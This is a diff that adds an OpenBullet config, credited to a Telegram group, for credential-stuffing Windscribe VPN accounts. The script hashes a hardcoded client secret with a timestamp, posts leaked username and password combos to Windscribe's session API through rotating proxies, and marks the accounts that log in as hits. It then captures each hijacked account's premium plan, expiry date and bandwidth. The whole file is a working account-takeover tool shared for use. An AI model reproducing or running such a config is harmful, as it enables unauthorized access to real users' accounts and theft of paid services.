@@ -1,0 +1,124 @@
+[SETTINGS]
+{
+  "Name": "Windscribe [Config By RaksTeam]",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2021-06-04T15:44:00.9003475+05:30",
+  "AdditionalInfo": "AdditionalInfo\": \"Windscribe Openbullet Config By RaksTeam | Combo : U:P & M:P| Proxy : UHQ | Telegram : @RaksTeam\"",
+  "Author": "𝙉𝘼𝙎𝙀𝙀𝙈 (RaksTeam)",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+!===================================
+!Read me: 
+! Don't forget the credit of config
+! Share with Credit
+! Telegram Channel : @RaksTeam
+!===================================
+
+#time FUNCTION CurrentUnixTime -> VAR "time" 
+
+#hash FUNCTION Hash MD5 "952b4412f002315aa50751032fcaab03<time>" -> VAR "hash" 
+
+REQUEST POST "https://api.windscribe.com/Session" 
+  CONTENT "username=<USER>&password=<PASS>&session_type_id=3&time=<time>&client_auth_hash=<hash>&platform=windows" 
+  CONTENTTYPE "text/plain" 
+  HEADER "Host: api.windscribe.com" 
+  HEADER "Accept: */*" 
+  HEADER "Content-type: text/html; charset=utf-8" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Content-Length: 132" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "username is too short" 
+    KEY "Could not log in with provided credentials" 
+  KEYCHAIN Success AND 
+    KEY "session_auth_hash" 
+
+#username PARSE "<SOURCE>" LR "username\": \"" "\"" CreateEmpty=FALSE -> CAP "username" 
+
+#1 PARSE "<SOURCE>" JSON "premium_expiry_date" -> VAR "1" 
+
+IF "<1>" NotEqualTo ""
+SET CAP "Plan" "PRO"
+SET CAP "Bandwidth" "Unlimited"
+SET CAP "Expires_In" "<1>"
+SET STATUS SUCCESS
+SET CAP "Config Developed By" "@Naseem0348"
+ELSE
+SET CAP "Plan" "FREE"
+
+#3 PARSE "<SOURCE>" JSON "traffic_used" -> VAR "3" 
+
+#4 FUNCTION Compute "(((<3>/1024)/1024)/1024)" -> VAR "4" 
+
+#6 FUNCTION Substring "0" "4" "<4>" -> VAR "6" 
+
+#2 PARSE "<SOURCE>" JSON "traffic_max" -> VAR "2" 
+
+#5 FUNCTION Compute "(((<2>/1024)/1024)/1024)" -> VAR "5" 
+
+#BB FUNCTION Constant "<6>/<5>GB" -> VAR "BB" 
+
+IF "<BB>" CONTAINS "<" 
+SET VAR "10" "0"
+
+FUNCTION Constant "<10>/<5>GB" -> CAP "Bandwidth" 
+
+SET CAP "Config Developed By" "@Naseem0348"
+ELSE
+SET CAP "Bandwidth" "<BB>"
+ENDIF
+IF "<Plan>" CONTAINS "FREE"
+SET CAP "Config Developed By" "@Naseem0348"
+SET STATUS Custom "FREE"
+ENDIF
+!===================================
+!Read me: 
+! Don't forget the credit of config
+! Share with Credit
+! Telegram Channel : @RaksTeam
+!===================================
+
